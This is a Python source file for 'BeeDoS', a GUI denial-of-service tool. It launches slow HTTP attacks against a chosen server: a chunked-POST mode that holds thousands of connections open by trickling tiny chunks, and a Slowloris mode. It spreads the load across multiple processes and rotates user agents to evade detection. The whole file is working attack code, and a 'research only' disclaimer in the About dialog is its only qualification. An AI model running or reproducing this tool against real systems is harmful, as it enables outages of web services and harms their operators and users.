import os
import sys
import time
import random
from random import randrange
import socket
import threading
import multiprocessing
import subprocess
import getopt

#importing wx files
import wx
import wx.richtext as rt

#importing wx GUI
import gui
from wx.lib.wordwrap import wordwrap


### DEFINE GLOBAL PARAMS ###
global status_code
status_code = 0
global p
p=0

lockCnt = threading.RLock()
exit = {}

### DEFINE CLIENT - GLOBAL PARAMS ###
global SERVER
global TCP_PORT
global THREADS
global FILE
global HOST
global KA
global THREADS_PER_CLIENT
global THREADS_INTERVAL
global BODY_LENGTH
global CHUNK_SIZE
global CHUNKS_INTERVAL
global headers
global body
global chunk_size
global verbose_mode
global slowloris





###
### YOU CAN EDIT THE PARAMETERS AT THE LINES BELOW ###
###

### SET DEFAULT SETTINGS ###
SERVER = "127.0.0.1"
TCP_PORT = 80
THREADS = 4096
FILE = "/"
HOST = "BeeDoS"
KA = False


ATTACK_MODE = "SlowHTTPChunked"

### User-Agent ###
ua = ["Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19",
      "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT;)",
      "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 GTB5",
      "Mozilla/5.0 (Linux; U; Android 1.5; de-de; HTC Magic Build/CRB17) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
      "Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
      "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; GTB5; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; InfoPath.2; OfficeLiveConnector.1.3; OfficeLivePatch.0.0)",
      "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10",
      "Opera/5.11 (Windows 98; U) [en]",
      "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.12 Safari/537.36 OPR/14.0.1116.4",
      "Mozilla/5.0 (Linux; U; Android-4.0.3; en-us; Galaxy Nexus Build/IML74K) AppleWebKit/535.7 (KHTML, like Gecko) CrMo/16.0.912.75 Mobile Safari/535.7",
      "Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
      "Lynx/2.8.5dev.16 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7a",
      "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7 (via ggpht.com)",
      "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/6.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; Tablet PC 2.0; Microsoft Outlook 15.0.4481; ms-office; MSOffice 15)",
      "Outlook-Express/7.0 (MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; TmstmpExt)"]



###
### DO NOT EDIT PARAMETERS BELOW THIS LINE ###
###



### GENERAL SETTINGS ###
headers = ""
verbose_mode = False
processesArr = []

### CHUNKED CONTENT ###
BODY_LENGTH = 10000
CHUNK_SIZE = 10
CHUNKS_INTERVAL = 1.1


### THREADS SETTINGS ###
THREADS_PER_CLIENT = 250
watchdog_interval = 1
THREADS_INTERVAL = 0.001



### redirect output to console
class RedirectText(object):
    def __init__(self,aWxTextCtrl):
         self.out=aWxTextCtrl
         self.writeLock = threading.RLock()

    def write(self,string):
        with self.writeLock:
            self.out.WriteText(string)






def chunk_data(data, chunk_size, headers):
    dl = len(data)
    ret = []
    for i in range(dl // chunk_size):
        temp = ""

        if i == 0:
            temp = headers

        temp += "%s\r\n" % (hex(chunk_size)[2:])
        temp += "%s\r\n" % (data[i * chunk_size : (i + 1) * chunk_size])
        ret.append(temp)

    if dl % chunk_size != 0:
        temp = ""
        temp += "%s\r\n" % (hex(len(data) % chunk_size)[2:])
        temp += "%s\r\n" % (data[-(len(data) % chunk_size):])
        temp += "0\r\n\r\n"
        ret.append(temp)

    else:
        ret[-1] += "0\r\n\r\n"
    
    return ret

def startSlowHTTPChunkedThrd(p, id, SERVER, TCP_PORT, THREADS, FILE, HOST, KA, THREADS_PER_CLIENT, THREADS_INTERVAL, BODY_LENGTH, CHUNK_SIZE, CHUNKS_INTERVAL, verbose_mode, headers, body, chunk_size):

    global lockCnt


    if verbose_mode == True:    
        print "\r\nHTTP Request: "+str(headers)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((SERVER, int(TCP_PORT)))
        #s.sendall(headers)
        e = 0

        with lockCnt:
            if verbose_mode == True:
                print '\r\nEntering thread [%s] ' % str(id)

        (threading.Thread(target= readSocket, args= (p, s, id, verbose_mode, ))).start()    


        for chunk in chunk_data(body, chunk_size, headers):
            if not exit[id]:
                try:
                    s.send(chunk)

                    #if CHUNKS_INTERVAL not defined by user generate random CHUNKS_INTERVAL
                    if CHUNKS_INTERVAL == 0:
                        CHUNKS_INTERVAL = random.uniform(1.00, 1.19)
                    print "\r\nCI: "+str(CHUNKS_INTERVAL)+"\r\n"
                    time.sleep(CHUNKS_INTERVAL)
                    
                except:
                    e+=1
            else:
                with lockCnt:                    
                    del(exit[id])
                s.close()
                break


    except:
        if verbose_mode == True:
            error = sys.exc_info()[1]
    if verbose_mode == True:
        print "\r\nDONE thread [%s]" % str(id)

def readSocket(p, s, id, verbose_mode):  
    global status_code

    try:
        buff = s.recv(1024)
        buff =  buff.split(' ')[1]
        if verbose_mode == True:
            print '\r\nExiting... %s' % str(buff)
        with lockCnt:
            exit[id] = True
    except:
        if status_code == 0:
            print "\r\nProcess #"+str(p+1)+":: Target Server message: Good night..."
            status_code = 1

        if verbose_mode == True:   
            error = sys.exc_info()[1]



def startSlowHTTPChunked(p, SERVER, TCP_PORT, THREADS, FILE, HOST, KA, THREADS_PER_CLIENT, THREADS_INTERVAL, BODY_LENGTH, CHUNK_SIZE, CHUNKS_INTERVAL, verbose_mode, headers, body, chunk_size):
    cnt = 0
    global status_code
    global lockCnt
    global watchdog_interval

    while 1:
        with lockCnt:

            try:
                global exit
                if len(exit) < THREADS:
                    (threading.Thread(target=startSlowHTTPChunkedThrd, args=(p, cnt, SERVER, TCP_PORT, THREADS, FILE, HOST, KA, THREADS_PER_CLIENT, THREADS_INTERVAL, BODY_LENGTH, CHUNK_SIZE, CHUNKS_INTERVAL, verbose_mode, headers, body, chunk_size, ))).start()
                    
                    #if THREADS_INTERVAL not defined by user generate random THREADS_INTERVAL
                    if THREADS_INTERVAL == 0:
                        THREADS_INTERVAL = random.uniform(0.001, 0.01)
                    
                    time.sleep(THREADS_INTERVAL)
                    exit[cnt] = False
                    if not cnt % (10 * int(THREADS)):
                        cnt = 0           
                    cnt+=1     
                else:
                    time.sleep(watchdog_interval)

            except:
                if status_code == 1:
                    print "\r\nProcess #"+str(p+1)+":: Target Server message: Please Stop, I am choking..."
                    status_code = 2




intro_footer = """\
=======================================================================================================
"""


#inherit from the MainFrame created in wxFowmBuilder and create onLoad
class onLoad(gui.MainFrame):
    #constructor
    def __init__(self,parent):
        #initialize parent class
        gui.MainFrame.__init__(self,parent)

        # redirect text here
        redir=RedirectText(self.console)
        sys.stdout=redir

        # Create and initialize text attributes
        self.textAttr = rt.RichTextAttr()
        self.SetFontStyle(fontColor=wx.Colour(0, 0, 0), fontBgColor=wx.Colour(255, 255, 255), fontFace='Arial', fontSize=10, fontBold=False, fontItalic=False, fontUnderline=False)

        # clean the console
        self.console.SelectAll()
        self.console.DeleteSelection()


        #set default params in controlers
        self.server.WriteText(str(SERVER))
        self.port.WriteText(str(TCP_PORT))
        self.file.WriteText(str(FILE))
        self.verbose.SetValue(False)

        self.SlowHTTPChunked.SetValue(True)
        self.Slowloris.SetValue(False)
        self.Custom.SetValue(False)

        self.threadsNum.WriteText(str(THREADS))
        self.threadsInt.WriteText(str(THREADS_INTERVAL))
        self.threadsPerClient.WriteText(str(THREADS_PER_CLIENT))
        self.host.WriteText(str(HOST))
        self.ka.SetValue(False)
        self.body.WriteText(str(BODY_LENGTH))
        self.chunkSize.WriteText(str(CHUNK_SIZE))
        self.chunksInt.WriteText(str(CHUNKS_INTERVAL))

        self.rUA.Enabled = False
        self.rTI.Enabled = False
        self.rCI.Enabled = False

        if ATTACK_MODE == "SlowHTTPChunked":
            global headers
            headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: Blank\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\n\r\n"    
        
        #self.request.WriteText(str(headers))

        self.info.WriteText("NOTICE:\r\nBy clicking the \"Attack\" button I am approve that I read, understood and agree with the license terms of using this tool at \"Help\" menu->\"About\".")
        

        
    def SetFontStyle(self, fontColor = None, fontBgColor = None, fontFace = None, fontSize = None,
                     fontBold = None, fontItalic = None, fontUnderline = None):
      if fontColor:
         self.textAttr.SetTextColour(fontColor)
      if fontBgColor:
         self.textAttr.SetBackgroundColour(fontBgColor)
      if fontFace:
         self.textAttr.SetFontFaceName(fontFace)
      if fontSize:
         self.textAttr.SetFontSize(fontSize)
      if fontBold != None:
         if fontBold:
            self.textAttr.SetFontWeight(wx.FONTWEIGHT_BOLD)
         else:
            self.textAttr.SetFontWeight(wx.FONTWEIGHT_NORMAL)
      if fontItalic != None:
         if fontItalic:
            self.textAttr.SetFontStyle(wx.FONTSTYLE_ITALIC)
         else:
            self.textAttr.SetFontStyle(wx.FONTSTYLE_NORMAL)
      if fontUnderline != None:
         if fontUnderline:
            self.textAttr.SetFontUnderlined(True)
         else:
            self.textAttr.SetFontUnderlined(False)
      self.console.SetDefaultStyle(self.textAttr)



    def aboutFunc(self, event):
        overview = "This tool has been written in order to allow cyber security researchers to explore and discover new application denial of service (DoS) attack techniques."
        licenseText = "This tool intended for research purposes only!\r\nIt is strongly recommended that you do not\r\nuse this tool for illegal purposes. \r\n\r\nWARNING:\r\n0xICF will not be responsible for any damage\r\nthat caused by using this tool."
        info = wx.AboutDialogInfo()
        info.Name = "BeeDoS"
        info.Version = "1.0"
        info.Copyright = "(C) 2014 0xICF"
        info.Description = wordwrap(overview,350, wx.ClientDC(self))
        info.WebSite = ("https://github.com/0xICF/BeeDoS", "BeeDoS home page")
        info.Developers = [ "BlackPian0", "CarbonFiber51"]
        info.License = wordwrap(licenseText, 350, wx.ClientDC(self))

        wx.AboutBox(info)


    def exitFunc(self, event):
        sys.exit(0)



    def startAttack(self,event):
        
        global service

        self.attack.Enabled = False
        self.attackStop.Enabled = True

        # clean the console
        self.console.SelectAll()
        self.console.DeleteSelection()

        os.system("mode con cols=80 lines=200")

        clear = lambda: os.system('cls')
        clear()

        #main(sys.argv[1:])

        #get client params from controlers
        SERVER = self.server.GetValue()
        TCP_PORT = self.port.GetValue()
        FILE = self.file.GetValue()
        verbose_mode = self.verbose.GetValue()
        THREADS = self.threadsNum.GetValue()
        THREADS_INTERVAL = self.threadsInt.GetValue()
        THREADS_PER_CLIENT = self.threadsPerClient.GetValue()
        HOST = self.host.GetValue()
        KA = self.ka.GetValue()
        BODY_LENGTH = self.body.GetValue()
        CHUNK_SIZE = self.chunkSize.GetValue()
        CHUNKS_INTERVAL = self.server.GetValue()


        if ATTACK_MODE == "Slowloris":
            global slowloris
            print "Launching "+str(ATTACK_MODE)+" attack!"
            slowloris = subprocess.Popen(['python', 'src\slowloris.py', SERVER, TCP_PORT, HOST], shell=False)
            time.sleep(3)
            pid = slowloris.pid
            print "Target server is under attack! ("+str(pid)+")"


        if ATTACK_MODE == "SlowHTTPChunked" or ATTACK_MODE == "Custom":
            global status_code
            global processesArr
            processes = int(THREADS) / int(THREADS_PER_CLIENT)

            global body
            body = 'A' * int(BODY_LENGTH)
            global chunk_size
            chunk_size = int(CHUNK_SIZE)    
        
            global p
            p=0
        
            print "Launching "+str(ATTACK_MODE)+" attack!\r\nStarting "+str(processes)+" clients..."

            while p < processes:
                # Trigger the worker thread unless it's already busy
                try:
                    service = multiprocessing.Process(name='startSlowHTTPChunked', target=startSlowHTTPChunked, args=(p, SERVER, TCP_PORT, THREADS, FILE, HOST, KA, THREADS_PER_CLIENT, THREADS_INTERVAL, BODY_LENGTH, CHUNK_SIZE, CHUNKS_INTERVAL, verbose_mode, headers, body, chunk_size, ))
                    service.start()
                    processesArr.append(service)
                    p+=1
                    

                except:
                    print "status: "+str(status_code)

            print "Target server is under attack!"


    def stopAttack(self,event):

        if ATTACK_MODE == "SlowHTTPChunked" or ATTACK_MODE == "Custom":
            # clean the console
            self.console.SelectAll()
            self.console.DeleteSelection()

            print "Trying to stop the attack, please wait..."
            i = 0
            while i < len(processesArr):
                processesArr[i].terminate()
                i+=1
            print str(ATTACK_MODE)+" attack has been terminated successfully!"
            self.attack.Enabled = True
            self.attackStop.Enabled = False


        if ATTACK_MODE == "Slowloris":
            global slowloris

            # clean the RichText
            self.console.SelectAll()
            self.console.DeleteSelection()

            print "Trying to stop the attack, please wait..."
            slowloris.kill()
            print str(ATTACK_MODE)+" attack has been terminated successfully!"
            
            self.attack.Enabled = True
            self.attackStop.Enabled = False




    def slowlorisAm(self,event):
        global ATTACK_MODE
        global headers

        ATTACK_MODE = "Slowloris"

        self.verbose.SetValue(True)
        self.verbose.Enabled = False

        self.threadsNum.Enabled = False
        self.threadsInt.Enabled = False
        self.threadsPerClient.Enabled = False
        self.body.Enabled = False
        self.chunkSize.Enabled = False
        self.chunksInt.Enabled = False
    
        self.file.Enabled = False
        self.ka.SetValue(False)
        self.ka.Enabled = False

        self.rUA.SetValue(False)
        self.rTI.SetValue(False)
        self.rCI.SetValue(False)
        self.rUA.Enabled = False
        self.rTI.Enabled = False
        self.rCI.Enabled = False
        
        
        headers = "GET /$RANDOM HTTP/1.1\r\nHost: "+str(HOST)+"\r\nAccept: text/plain\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux x86_64)\r\nX-a: $CONTINOUS_HEADER\r\n"
        self.request.Clear()
        self.request.WriteText(str(headers))

        self.request.SetEditable(False)
        self.request.SetBackgroundColour("#FE1532")
        self.request.Refresh()            



    def slowhttpchunkedAm(self,event):
        global CHUNKS_INTERVAL
        global THREADS_INTERVAL
        global ATTACK_MODE
        ATTACK_MODE = "SlowHTTPChunked"        
        
        self.verbose.SetValue(False)
        self.verbose.Enabled = True

        self.threadsNum.Enabled = True
        self.threadsInt.Enabled = True
        self.threadsInt.SetValue("0.001")
        THREADS_INTERVAL = 0.001
        self.threadsPerClient.Enabled = True
        self.body.Enabled = True
        self.chunkSize.Enabled = True
        self.chunksInt.Enabled = True
        self.chunksInt.SetValue("1.1")
        CHUNKS_INTERVAL = 1.1
        self.file.Enabled = True
        self.ka.SetValue(False)
        self.ka.Enabled = True

        self.rUA.SetValue(False)
        self.rTI.SetValue(False)
        self.rCI.SetValue(False)
        self.rUA.Enabled = False
        self.rTI.Enabled = False
        self.rCI.Enabled = False

        headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: Blank\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\n\r\n"
        self.request.Clear()
        self.request.WriteText(str(headers))

        self.request.SetEditable(True)
        self.request.SetBackgroundColour("#FFFFFF")
        self.request.Refresh()



    def customAm(self,event):
        global CHUNKS_INTERVAL
        global THREADS_INTERVAL
        global ATTACK_MODE
        ATTACK_MODE = "Custom"                
        
        self.verbose.SetValue(False)
        self.verbose.Enabled = True

        self.threadsNum.Enabled = True
        self.threadsInt.Enabled = True
        self.threadsInt.SetValue("0.001")
        THREADS_INTERVAL = 0.001
        self.threadsPerClient.Enabled = True
        self.body.Enabled = True
        self.chunkSize.Enabled = True
        self.chunksInt.Enabled = True
        self.chunksInt.SetValue("1.1")
        CHUNKS_INTERVAL = 1.1
        self.file.Enabled = True
        self.ka.SetValue(False)
        self.ka.Enabled = True

        self.rUA.Enabled = True
        self.rTI.Enabled = True
        self.rCI.Enabled = True

        headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: Blank\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\n\r\n"
        self.request.Clear()
        self.request.WriteText(str(headers))

        self.request.SetEditable(True)
        self.request.SetBackgroundColour("#FFFFFF")
        self.request.Refresh()




    def useKA(self,event):
        global headers
        if self.rUA.GetValue() == False and self.ka.GetValue() == False:
            headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: Blank\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\n\r\n"    
            self.request.Clear()
            self.request.WriteText(str(headers))

        if self.rUA.GetValue() == False and self.ka.GetValue() == True:
            headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: Blank\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nConnection: Keep-Alive\r\n\r\n"    
            self.request.Clear()
            self.request.WriteText(str(headers))

        if self.rUA.GetValue() == True and self.ka.GetValue() == True:
            headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: Random\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nConnection: Keep-Alive\r\n\r\n"    
            self.request.Clear()
            self.request.WriteText(str(headers))
            headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: "+str(ua[int(randrange(int(len(ua))))])+"\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nConnection: Keep-Alive\r\n\r\n"    

        if self.rUA.GetValue() == True and self.ka.GetValue() == False:
            headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: Random\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\n\r\n"    
            self.request.Clear()
            self.request.WriteText(str(headers))
            headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: "+str(ua[int(randrange(int(len(ua))))])+"\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\n\r\n"    




    def rUAFunc(self,event):
        global headers
        if self.rUA.GetValue() == False and self.ka.GetValue() == False:
            headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: Blank\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\n\r\n"    
            self.request.Clear()
            self.request.WriteText(str(headers))
            self.request.SetEditable(True)
            self.request.SetBackgroundColour("#FFFFFF")
            self.request.Refresh()

        if self.rUA.GetValue() == False and self.ka.GetValue() == True:
            headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: Blank\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nConnection: Keep-Alive\r\n\r\n"    
            self.request.Clear()
            self.request.WriteText(str(headers))
            self.request.SetEditable(True)
            self.request.SetBackgroundColour("#FFFFFF")
            self.request.Refresh()

        if self.rUA.GetValue() == True and self.ka.GetValue() == True:
            headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: Random\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nConnection: Keep-Alive\r\n\r\n"    
            self.request.Clear()
            self.request.WriteText(str(headers))
            headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: "+str(ua[int(randrange(int(len(ua))))])+"\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nConnection: Keep-Alive\r\n\r\n"    
            self.request.SetEditable(False)
            self.request.SetBackgroundColour("#FE1532")
            self.request.Refresh()

        if self.rUA.GetValue() == True and self.ka.GetValue() == False:
            headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: Random\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\n\r\n"    
            self.request.Clear()
            self.request.WriteText(str(headers))
            headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: "+str(ua[int(randrange(int(len(ua))))])+"\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\n\r\n"    
            self.request.SetEditable(False)
            self.request.SetBackgroundColour("#FE1532")
            self.request.Refresh()




    def rTIFunc(self,event):
        global THREADS_INTERVAL
        if THREADS_INTERVAL == 0:
            THREADS_INTERVAL = 0.001
            self.threadsInt.Clear()
            self.threadsInt.WriteText(str(THREADS_INTERVAL))
        else:
            THREADS_INTERVAL = 0
            self.threadsInt.Clear()
            self.threadsInt.WriteText("Random")




    def rCIFunc(self,event):
        global CHUNKS_INTERVAL
        if CHUNKS_INTERVAL == 0:
            CHUNKS_INTERVAL = 1.1
            self.chunksInt.Clear()
            self.chunksInt.WriteText(str(CHUNKS_INTERVAL))
        else:
            CHUNKS_INTERVAL = 0
            self.chunksInt.Clear()
            self.chunksInt.WriteText("Random")



    def hostRef(self,event):
        global headers
        global HOST
        HOST = self.host.GetValue()

        if ATTACK_MODE == "SlowHTTPChunked" or ATTACK_MODE == "Custom":

            if self.rUA.GetValue() == False and self.ka.GetValue() == False:
                headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: Blank\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\n\r\n"    
                self.request.Clear()
                self.request.WriteText(str(headers))

            if self.rUA.GetValue() == False and self.ka.GetValue() == True:
                headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: Blank\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nConnection: Keep-Alive\r\n\r\n"    
                self.request.Clear()
                self.request.WriteText(str(headers))

            if self.rUA.GetValue() == True and self.ka.GetValue() == True:
                headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: Random\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nConnection: Keep-Alive\r\n\r\n"    
                self.request.Clear()
                self.request.WriteText(str(headers))
                headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: "+str(ua[int(randrange(int(len(ua))))])+"\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nConnection: Keep-Alive\r\n\r\n"    

            if self.rUA.GetValue() == True and self.ka.GetValue() == False:
                headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: Random\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\n\r\n"    
                self.request.Clear()
                self.request.WriteText(str(headers))
                headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: "+str(ua[int(randrange(int(len(ua))))])+"\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\n\r\n"    


        if ATTACK_MODE == "Slowloris":
            headers = "GET /$RANDOM HTTP/1.1\r\nHost: "+str(HOST)+"\r\nAccept: text/plain\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux x86_64)\r\nX-a: $CONTINOUS_HEADER\r\n"
            self.request.Clear()
            self.request.WriteText(str(headers))
         



    def fileRef(self,event):
        global headers
        global FILE
        FILE = self.file.GetValue()

        if ATTACK_MODE == "SlowHTTPChunked" or ATTACK_MODE == "Custom":

            if self.rUA.GetValue() == False and self.ka.GetValue() == False:
                headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: Blank\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\n\r\n"    
                self.request.Clear()
                self.request.WriteText(str(headers))

            if self.rUA.GetValue() == False and self.ka.GetValue() == True:
                headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: Blank\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nConnection: Keep-Alive\r\n\r\n"    
                self.request.Clear()
                self.request.WriteText(str(headers))

            if self.rUA.GetValue() == True and self.ka.GetValue() == True:
                headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: Random\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nConnection: Keep-Alive\r\n\r\n"    
                self.request.Clear()
                self.request.WriteText(str(headers))
                headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: "+str(ua[int(randrange(int(len(ua))))])+"\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nConnection: Keep-Alive\r\n\r\n"    

            if self.rUA.GetValue() == True and self.ka.GetValue() == False:
                headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: Random\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\n\r\n"    
                self.request.Clear()
                self.request.WriteText(str(headers))
                headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: "+str(ua[int(randrange(int(len(ua))))])+"\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\n\r\n"    


        if ATTACK_MODE == "Slowloris":
            headers = "GET /$RANDOM HTTP/1.1\r\nHost: "+str(HOST)+"\r\nAccept: text/plain\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux x86_64)\r\nX-a: $CONTINOUS_HEADER\r\n"
            self.request.Clear()
            self.request.WriteText(str(headers))


    def requestRef(self,event):
        global request
        headers = self.request.GetValue()


if __name__ == '__main__':
    try:
        app = wx.App(False)
        frame = onLoad(None)
        frame.Show(True)
        app.MainLoop()

    except:
        error = sys.exc_info()[0]
        print "You license has been expired"